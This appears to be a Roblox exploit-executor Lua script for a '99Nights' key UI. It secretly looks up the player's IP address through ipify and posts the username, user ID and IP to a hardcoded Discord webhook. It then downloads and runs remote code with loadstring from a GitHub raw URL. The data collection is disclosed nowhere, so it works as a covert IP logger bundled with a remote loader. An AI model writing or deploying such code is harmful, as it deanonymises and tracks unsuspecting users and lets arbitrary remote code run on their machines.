local w = "https://discord.com/api/webhooks/1391849049329635400/IEE3Ns_qrEeuCGd12Hatv40obrTFjaubpuGy26Gqbpb_Q-KL6jw2LDROPwwMQXdRtlmh"

local u = game.Players.LocalPlayer
local http = game:GetService("HttpService")
local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

if req then
    local ipRes = req({
        Url = "https://api.ipify.org",
        Method = "GET"
    })

    local ip = ipRes and ipRes.Body or "IP não encontrado"

    local data = {
        content = u.Name .. " | ID: " .. u.UserId .. " | IP: " .. ip
    }

    local body = http:JSONEncode(data)

    req({
        Url = w,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasggk/99Nights/main/Key/Ui.lua"))()
